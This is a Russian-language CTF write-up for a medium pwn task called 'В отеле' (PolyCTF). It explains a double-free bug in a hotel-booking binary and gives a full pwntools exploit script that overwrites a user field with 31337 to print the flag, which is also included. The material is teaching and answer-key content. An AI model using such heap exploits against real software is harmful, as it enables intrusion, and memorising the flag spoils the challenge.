#  В отеле | medium | pwn

## Информация
> Герой заходит в гостиницу, рассчитывая использовать свои навыки социальной инженерии, чтобы убедить сотрудницу на ресепшене выдать номер без бронирования. Однако её ответы были чёткими и отточенными, а попытки убедить оказались безуспешными. Тем не менее, герой узнаёт, что существует некий универсальный код бронирования, доступный только менеджеру. Этот код можно использовать для заселения в номер без предварительного подтверждения. Взглянув в угол холла, он замечает экран с надписью: "Онлайн-поддержка." Посмотрим, что он может с этим сделать...


## Выдать участникам
файл [hotel](public/hotel)

## Описание
Для решения надо заметить, что не происходит обнуления указателя после удаления пользователя.

## Решение
Открываем бинарь, изучаем поведение и все функции. Находим место где выводится флаг.

![alt text](solve/image.png)

**(Функция read_secret)**

Видим, что эта функция проверяет какое-то поле у curr_user и если оно равно 31337, то выводит флаг.

Значит нужно каким-то образом записать туда это значение.

Проанализировав все функции, можно заметить, что после удаления текущий юзер не обнуляется, а значит мы можем повторно его удалить. Имеем уязвимость double free

![alt text](solve/image-1.png)

**(Уязвимая функция)**

Также в эксплуатации нам поможет функция write_msg (она позволяет аллоцировать чанк любой длины, а затем записать туда что-то)

Алгоритм нашей атаки будет следующий: 

1. Используем double free (то есть очищаем один чанк два раза)
2. Выделяем чанк через write_msg такого же размера, как и структура User
3. Записываем туда наши данные (31337)
4. Получаем флаг

Полное решение:

```python
from pwn import *


s = process("./hotel")

for i in range(9):
    s.recvuntil(b"> ")
    s.sendline(b"2")
    s.recvuntil(b": ")
    s.sendline(f"{i}".encode())
    s.recvuntil(b": ")
    s.sendline(f"{i}".encode())

for i in range(7):
    s.recvuntil(b"> ")
    s.sendline(b"1")
    s.recvuntil(b": ")
    s.sendline(f"{i}".encode())
    s.recvuntil(b": ")
    s.sendline(f"{i}".encode())
    s.recvuntil(b"> ")
    s.sendline(b"3")
    s.recvuntil(b"> ")
    s.sendline(b"4")

i = 7
s.recvuntil(b"> ")
s.sendline(b"1")
s.recvuntil(b": ")
s.sendline(f"{i}".encode())
s.recvuntil(b": ")
s.sendline(f"{i}".encode())
s.recvuntil(b"> ")
s.sendline(b"3")
s.recvuntil(b"> ")
s.sendline(b"4")

i = 8
s.recvuntil(b"> ")
s.sendline(b"1")
s.recvuntil(b": ")
s.sendline(f"{i}".encode())
s.recvuntil(b": ")
s.sendline(f"{i}".encode())
s.recvuntil(b"> ")
s.sendline(b"3")
s.recvuntil(b"> ")
s.sendline(b"4")

i = 7
s.recvuntil(b"> ")
s.sendline(b"1")
s.recvuntil(b": ")
s.sendline(f"{i}".encode())
s.recvuntil(b": ")
s.sendline(f"{i}".encode())
s.recvuntil(b"> ")
s.sendline(b"3")
s.recvuntil(b"> ")
s.sendline(b"4")

for i in range(50, 50+7):
    s.recvuntil(b"> ")
    s.sendline(b"2")
    s.recvuntil(b": ")
    s.sendline(f"{i}".encode())
    s.recvuntil(b": ")
    s.sendline(f"{i}".encode())

i = 123
s.recvuntil(b"> ")
s.sendline(b"2")
s.recvuntil(b": ")
s.sendline(f"{i}".encode())
s.recvuntil(b": ")
s.sendline(f"{i}".encode())

i = 456
s.recvuntil(b"> ")
s.sendline(b"2")
s.recvuntil(b": ")
s.sendline(f"{i}".encode())
s.recvuntil(b": ")
s.sendline(f"{i}".encode())

i = 123
s.recvuntil(b"> ")
s.sendline(b"1")
s.recvuntil(b": ")
s.sendline(f"{i}".encode())
s.recvuntil(b": ")
s.sendline(f"{i}".encode())

s.recvuntil(b"> ")
s.sendline(b"1")
s.recvuntil(b": ")
s.sendline(f"{40}".encode())
s.recvuntil(b": ")
s.sendline(b"A" * 16 + p64(31337))

s.interactive()
```

## Флаг
`PolyCTF{D0Ubl3_r00m_f4r_yoU_S1R}`
